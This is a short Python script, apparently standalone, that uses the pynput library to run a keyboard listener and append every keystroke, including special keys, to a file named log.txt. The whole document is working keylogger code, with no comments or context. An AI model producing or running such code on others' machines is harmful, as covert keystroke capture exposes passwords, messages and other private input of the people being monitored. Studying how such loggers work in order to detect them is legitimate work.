from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(f"{key.char}")
        except Exception as error:
            f.write(f"[{key}, {error}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()